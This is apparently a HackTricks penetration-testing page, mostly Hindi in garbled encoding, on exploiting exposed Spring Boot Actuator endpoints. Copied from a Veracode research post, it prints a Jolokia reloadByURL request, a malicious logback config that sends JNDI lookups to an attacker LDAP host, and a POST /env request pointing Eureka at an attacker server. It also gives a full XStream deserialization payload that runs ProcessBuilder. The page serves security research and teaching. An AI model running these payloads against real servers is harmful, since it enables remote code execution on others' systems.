# Spring Actuators

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**рд╕реЗ** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Spring Boot Actuators рдХрд╛ рд╢реЛрд╖рдг

**рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Spring Boot Framework рдореЗрдВ рдХрдИ рд╕реБрд╡рд┐рдзрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ actuators рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдирд┐рдЧрд░рд╛рдиреА рдФрд░ рдкреНрд░рдмрдВрдзрди рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдЖрдк рдЗрд╕реЗ рдкреНрд░реЛрдбрдХреНрд╢рди рдореЗрдВ рдзрдХреЗрд▓рддреЗ рд╣реИрдВред рдСрдбрд┐рдЯрд┐рдВрдЧ, рд╕реНрд╡рд╛рд╕реНрдереНрдп, рдФрд░ рдореЗрдЯреНрд░рд┐рдХреНрд╕ рдПрдХрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдЗрд░рд╛рджреЗ рд╕реЗ, рдпреЗ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЗ рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рджреНрд╡рд╛рд░ рднреА рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЬрдм рдПрдХ Spring Boot рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ (рдЬреИрд╕реЗ '/health', '/trace', '/beans', '/env' рдЖрджрд┐) рдХреЛ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд░рддрд╛ рд╣реИред Spring Boot 1 - 1.4 рдХреЗ рд▓рд┐рдП, рд╡реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рд╕реБрд▓рдн рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рд╛рде рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рдорд╕реНрдпрд╛рдПрдВ рд╣реЛрддреА рд╣реИрдВред Spring рд╕рдВрд╕реНрдХрд░рдг 1.5 рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрдХрд░, '/health' рдФрд░ '/info' рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╕рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрд╡рд▓рдкрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрдХреНрд╖рдо рдХреА рдЬрд╛рддреА рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Actuator рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рд╣рд┐рддрд╛рд░реНрде рд░рдЦрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ:

* /dump - рдереНрд░реЗрдбреНрд╕ рдХрд╛ рдбрдВрдк рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдЬрд┐рд╕рдореЗрдВ рд╕реНрдЯреИрдХ рдЯреНрд░реЗрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИ)
* /trace - рдкрд┐рдЫрд▓реЗ рдХрдИ HTTP рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдЬрд┐рд╕рдореЗрдВ рд╕рддреНрд░ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ)
* /logfile - рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рджреЗрддрд╛ рд╣реИ
* /shutdown - рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИ
* /mappings - рд╕рднреА MVC рдХрдВрдЯреНрд░реЛрд▓рд░ рдореИрдкрд┐рдВрдЧреНрд╕ рджрд┐рдЦрд╛рддрд╛ рд╣реИ
* /env - рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡рд╛рддрд╛рд╡рд░рдг рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ
* /actuator/env
* /restart - рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рддрд╛ рд╣реИ
* /heapdump - рд╣рдорд╛рд░реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП JVM рд╕реЗ рдПрдХ рд╣реАрдк рдбрдВрдк рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рд▓реМрдЯрд╛рддрд╛ рд╣реИ

Spring 1x рдХреЗ рд▓рд┐рдП, рд╡реЗ рдореВрд▓ URL рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдкрдВрдЬреАрдХреГрдд рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ 2x рдореЗрдВ рд╡реЗ "/actuator/" рдмреЗрд╕ рдкрде рдкрд░ рдЪрд▓реЗ рдЧрдП рд╣реИрдВред

**рд╢реЛрд╖рдг:**

рдЕрдзрд┐рдХрд╛рдВрд╢ actuators рдХреЗрд╡рд▓ GET рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдХреЗрд╡рд▓ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдбреЗрдЯрд╛ рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╢реЗрд▓ рд╢рд┐рдХрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рджрд┐рд▓рдЪрд╕реНрдк рд╣реИрдВ:

**1. '/jolokia' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди**

рдпрджрд┐ Jolokia Library рд▓рдХреНрд╖реНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ Spring Boot рджреНрд╡рд╛рд░рд╛ '/jolokia' actuator рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рддрд╣рдд рдкреНрд░рдХрдЯ рдХреА рдЬрд╛рддреА рд╣реИред Jolokia рд╕рднреА рдкрдВрдЬреАрдХреГрдд MBeans рддрдХ HTTP рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ JMX рдХреЗ рд╕рд╛рде рдЖрдк рдЬреЛ рдСрдкрд░реЗрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╕рднреА рдЙрдкрд▓рдмреНрдз MBeans рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

рдлрд┐рд░ рд╕реЗ, рдЕрдзрд┐рдХрд╛рдВрд╢ MBeans рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреЗрд╡рд▓ рдХреБрдЫ рд╕рд┐рд╕реНрдЯрдо рдбреЗрдЯрд╛ рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ рдХрд░рддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдПрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ:

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_jolokia.png)

'**reloadByURL**' рдХреНрд░рд┐рдпрд╛, рдЬреЛ Logback рд▓рд╛рдЗрдмреНрд░реЗрд░реА рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИ, рд╣рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА URL рд╕реЗ рд▓реЙрдЧрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕реЗ рдХреЗрд╡рд▓ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдХреЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

рддреЛ, рд╣рдореЗрдВ рд▓реЙрдЧрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреА рдкрд░рд╡рд╛рд╣ рдХреНрдпреЛрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП? рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рджреЛ рдЪреАрдЬреЛрдВ рдХреЗ рдХрд╛рд░рдг:

1. рдХреЙрдиреНрдлрд╝рд┐рдЧ XML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╣реИ, рдФрд░ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ, Logback рдЗрд╕реЗ External Entities рд╕рдХреНрд╖рдо рдХреЗ рд╕рд╛рде рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЕрдВрдзрд╛ XXE рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред
2. Logback рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ ['JNDI рд╕реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ'] рдХреА рд╕реБрд╡рд┐рдзрд╛ рд╣реИ(https://logback.qos.ch/manual/configuration.html#insertFromJNDI). XML рдлрд╝рд╛рдЗрд▓ рдореЗрдВ, рд╣рдо рдПрдХ рдЯреИрдЧ рдЬреИрд╕реЗ '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд╛рдо рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ DirContext.lookup() рд╡рд┐рдзрд┐ рдХреЗ рдкрд╛рд╕ рдкрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рд╣рдо .lookup() рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдПрдХ рдордирдорд╛рдирд╛ рдирд╛рдо рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ XXE рдпрд╛ HeapDump рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╣рдореЗрдВ рдкреВрд░реНрдг **рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди** рджреЗрддрд╛ рд╣реИред

**рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:**

1\. рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрд░реЛрдХреНрдд URL рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ 'reloadByURL' рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬреЛ 'qos.logback.classic.jmx.JMXConfigurator' рдХреНрд▓рд╛рд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

2\. 'reloadByURL' рдлрд╝рдВрдХреНрд╢рди [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) рд╕реЗ рдПрдХ рдирдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ Logback рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП:
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. рдЬрдм рдпрд╣ рдлрд╝рд╛рдЗрд▓ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд░реНрд╡рд░ рдкрд░ рдкрд╛рд░реНрд╕ рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ "env-entry-name" рдкреИрд░рд╛рдореАрдЯрд░ рдорд╛рди рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд LDAP рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рддреА рд╣реИ, рдЬреЛ JNDI рд╕рдВрдХрд▓реНрдкрдирд╛ рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддреА рд╣реИред рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг LDAP рд╕рд░реНрд╡рд░ 'Reference' рдкреНрд░рдХрд╛рд░ рдХреА рдПрдХ рд╡рд╕реНрддреБ рд▓реМрдЯрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд▓рдХреНрд╖рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ **рд╕рдкреНрд▓рд╛рдИ рдХрд┐рдП рдЧрдП рдмрд╛рдЗрдЯрдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред JNDI рд╣рдорд▓реЛрдВ рдХреА рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдЗрд╕ [MicroFocus рд╢реЛрдз рдкрддреНрд░](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf) рдореЗрдВ рдХреА рдЧрдИ рд╣реИред [рдирдИ JNDI рд╢реЛрд╖рдг рддрдХрдиреАрдХ](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (рдЬрд┐рд╕рдХрд╛ рд╡рд░реНрдгрди рдкрд╣рд▓реЗ рд╣рдорд╛рд░реЗ рдмреНрд▓реЙрдЧ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛) рдпрд╣рд╛рдБ рднреА рдХрд╛рдо рдХрд░рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ Tomcat Spring Boot Framework рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд░реНрд╡рд░ рд╣реИред

**2. '/env' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╕рдВрд╢реЛрдзрди**

рдпрджрд┐ Spring Cloud Libraries рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рд╣реИрдВ, рддреЛ **'/env'** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдЖрдкрдХреЛ Spring рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдЧреБрдгрдзрд░реНрдореЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╕рднреА '**@ConfigurationProperties**' рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдВрдХрд┐рдд рдмреАрдиреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреБрдирдГ рдмрд╛рдБрдзрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред '/configprops' рдПрдХреНрдЪреБрдПрдЯрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрдИ, рд▓реЗрдХрд┐рди рд╕рднреА рдирд╣реАрдВ, рдЧреБрдгрдзрд░реНрдореЛрдВ рдХреЛ рд╣рдо рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдЙрдирдореЗрдВ рд╕реЗ рдЯрди рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдмрд┐рд▓реНрдХреБрд▓ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдХреНрдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХреБрдЫ рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЙрдирдХреЗ рд╕рд╛рде рдЦреЗрд▓рддреЗ рд╣реБрдП рдХреБрдЫ рджрд┐рди рдмрд┐рддрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╣рдордиреЗ рдпрд╣ рдкрд╛рдпрд╛:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
рдпрд╣ рдкреНрд░реЙрдкрд░реНрдЯреА Eureka serviceURL рдХреЛ рдордирдорд╛рдиреЗ рдореВрд▓реНрдп рдореЗрдВ рдмрджрд▓ рджреЗрддреА рд╣реИред Eureka Server рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдПрдХ рдбрд┐рд╕реНрдХрд╡рд░реА рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рд▓рдЧрднрдЧ рд╕рднреА Spring Cloud рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рд╕реНрдЯреЗрдЯрд╕ рдЕрдкрдбреЗрдЯ рднреЗрдЬрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЛ рднрд╛рдЧреНрдп рд╕реЗ рд▓рдХреНрд╖реНрдп рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ Eureka-Client <1.8.7 рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ (рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ Spring Cloud Netflix рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ), рддреЛ рдЖрдк рдЗрд╕рдореЗрдВ **XStream deserialization vulnerability** рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдмрд╕ 'eureka.client.serviceUrl.defaultZone' рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ '/env' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ URL ([http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ '/refresh' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЙрд╕рдХреЗ рдмрд╛рдж, рдЖрдкрдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде XStream рдкреЗрд▓реЛрдб рд╕рд░реНрд╡ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
```markdown
рдпрд╣ XStream рдкреЗрд▓реЛрдб [Marshalsec рдЕрдиреБрд╕рдВрдзрд╛рди](https://github.com/mbechler/marshalsec) рд╕реЗ ImageIO JDK-only рдЧреИрдЬреЗрдЯ рдЪреЗрди рдХрд╛ рдереЛрдбрд╝рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рд╣реИред рдпрд╣рд╛рдБ рдХреЗрд╡рд▓ рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ **LinkedHashSet** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ 'jdk.nashorn.internal.objects.NativeString.hashCode()' рд╡рд┐рдзрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдореВрд▓ рдкреЗрд▓реЛрдб java.lang.Map рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣реА рд╡реНрдпрд╡рд╣рд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд▓реЗрдХрд┐рди Eureka рдХреА XStream рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдореИрдкреНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ [рдХрд╕реНрдЯрдо 